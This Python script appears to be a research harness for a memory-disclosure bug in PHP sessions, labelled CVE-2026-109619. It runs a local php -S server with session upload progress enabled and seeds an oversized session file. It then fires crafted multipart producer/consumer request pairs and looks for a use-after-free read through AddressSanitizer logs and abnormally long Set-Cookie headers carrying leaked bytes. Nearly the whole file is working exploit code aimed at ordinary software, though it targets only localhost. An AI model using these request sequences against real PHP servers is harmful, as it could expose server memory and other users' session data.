#!/usr/bin/env python3
"""Hunt for the CVE-2026-109619 PS(id) memory-disclosure variant.

Strategy: run a matrix of producer (req1) / consumer (req2) sequences against
php -S (ASan build first: any UAF read involving PS(id) shows in the log even
if no cookie is emitted; normal build to capture actual leaked bytes).

Usage: leak_hunt.py --php <binary> [--label NAME]
"""
import argparse
import os
import re
import socket
import subprocess
import sys
import tempfile
import time

BOUNDARY = "LEAKHUNT"
SID = "d" * 32
ARRAY_SIZE = 1048576
BIG_SESSION = b"x|a:%d:{" % ARRAY_SIZE + b"i:0;" * ARRAY_SIZE
SMALL_SESSION = b"x|i:1;"


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def part(name, value):
    return (f"--{BOUNDARY}\r\nContent-Disposition: form-data; "
            f"name=\"{name}\"\r\n\r\n{value}\r\n").encode()


def filepart(name="f", filename="a", data=b"Z"):
    return (f"--{BOUNDARY}\r\nContent-Disposition: form-data; "
            f"name=\"{name}\"; filename=\"{filename}\"\r\n\r\n").encode() + data + b"\r\n"


def body(*parts):
    return b"".join(parts) + f"--{BOUNDARY}--\r\n".encode()


def request(port, payload, extra_headers=None, timeout=30):
    head = ("POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Content-Length: {len(payload)}\r\nConnection: close\r\n")
    for k, v in (extra_headers or {}).items():
        head += f"{k}: {v}\r\n"
    head += "\r\n"
    out = b""
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(head.encode() + payload)
        while True:
            c = s.recv(65536)
            if not c:
                break
            out += c
        s.close()
    except OSError as e:
        out += f"<conn error: {e}>".encode()
    return out


def split_resp(raw):
    if b"\r\n\r\n" in raw:
        h, b = raw.split(b"\r\n\r\n", 1)
    else:
        h, b = raw, b""
    status = h.split(b"\r\n", 1)[0].decode("latin1") if h else "<none>"
    cookies = [ln.decode("latin1") for ln in h.split(b"\r\n")
               if ln.lower().startswith(b"set-cookie:")]
    return status, cookies, b


def start_server(php, port, www, sess, extra_ini):
    ini = {
        "memory_limit": "16M",
        "session.save_path": sess,
        "session.upload_progress.enabled": "1",
        "session.upload_progress.cleanup": "1",
        "session.upload_progress.freq": "1%",
        "session.upload_progress.min_freq": "0",
        "session.use_strict_mode": "0",
        "session.use_cookies": "1",
        "session.use_only_cookies": "0",
        "session.cache_limiter": "",
        "display_errors": "0",
        "log_errors": "1",
    }
    ini.update(extra_ini)
    args = [php]
    for k, v in ini.items():
        args += ["-d", f"{k}={v}"]
    args += ["-S", f"127.0.0.1:{port}", "-t", www]
    return args


def seed(sess, data):
    with open(os.path.join(sess, "sess_" + SID), "wb") as f:
        f.write(data)


def unseed(sess):
    p = os.path.join(sess, "sess_" + SID)
    if os.path.exists(p):
        os.unlink(p)


def run_case(php, label, producer, consumer, seed_mode, extra_ini=None):
    root = tempfile.mkdtemp(prefix="leak-")
    www, sess = os.path.join(root, "www"), os.path.join(root, "sess")
    os.makedirs(www)
    os.makedirs(sess)
    with open(os.path.join(www, "index.php"), "w") as f:
        f.write('<?php echo "ok\\n";\n')
    log_path = os.path.join(root, "server.log")
    log = open(log_path, "wb")
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=0:halt_on_error=0:handle_segv=1"
    port = free_port()
    proc = subprocess.Popen(start_server(php, port, www, sess, extra_ini or {}),
                            stdout=log, stderr=log, env=env)
    try:
        for _ in range(100):
            if proc.poll() is not None:
                break
            try:
                socket.create_connection(("127.0.0.1", port), timeout=0.2).close()
                break
            except OSError:
                time.sleep(0.05)
        if seed_mode == "big":
            seed(sess, BIG_SESSION)
        r1 = request(port, producer)
        st1, ck1, _ = split_resp(r1)
        alive1 = proc.poll() is None
        time.sleep(0.2)
        if seed_mode == "big":
            seed(sess, SMALL_SESSION)
        elif seed_mode == "none":
            unseed(sess)
        r2 = request(port, consumer)
        st2, ck2, _ = split_resp(r2)
        time.sleep(0.3)
        alive2 = proc.poll() is None
        log.close()
        with open(log_path, "rb") as f:
            logtxt = f.read().decode("latin1", "replace")
        asan_frames = sorted(set(re.findall(r"in (\w+) [^\n]*session\.c", logtxt)))
        asan_hit = "AddressSanitizer" in logtxt
        interesting = [c for c in ck1 + ck2 if len(c) > 80]
        print(f"[{label}] req1: {st1} alive={alive1} | req2: {st2} alive={alive2} "
              f"asan={asan_hit}")
        if asan_frames:
            print(f"    asan session.c frames: {asan_frames}")
        for c in ck1:
            print(f"    req1 cookie ({len(c)}): {c[:120]}")
        for c in ck2:
            print(f"    req2 cookie ({len(c)}): {c[:120]}")
        if interesting:
            print("    *** LONG COOKIE PRESENT ***")
        oom = "Allowed memory size" in logtxt
        print(f"    oom_in_log={oom}")
        return interesting, logtxt
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(2)
            except subprocess.TimeoutExpired:
                proc.kill()
        log.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--php", required=True)
    ap.add_argument("--label", default="run")
    args = ap.parse_args()

    # producers
    p_std = body(part("PHPSESSID", SID), part("PHP_SESSION_UPLOAD_PROGRESS", "x"),
                 filepart())
    # consumers
    c_std = body(part("PHPSESSID", SID), part("PHP_SESSION_UPLOAD_PROGRESS", "x"),
                 filepart())
    c_nofile = body(part("PHPSESSID", SID), part("PHP_SESSION_UPLOAD_PROGRESS", "x"))
    c_nosid = body(part("PHP_SESSION_UPLOAD_PROGRESS", "x"), filepart())
    c_sidcookie = body(part("PHP_SESSION_UPLOAD_PROGRESS", "x"), filepart())

    cases = [
        ("P1+C1 std", p_std, c_std, "big", None),
        ("P1+C3 nofile", p_std, c_nofile, "big", None),
        ("P1+C2 nosid-field", p_std, c_nosid, "none", None),
    ]
    for label, prod, cons, seed_mode, ini in cases:
        run_case(args.php, f"{args.label}/{label}", prod, cons, seed_mode, ini)


if __name__ == "__main__":
    main()
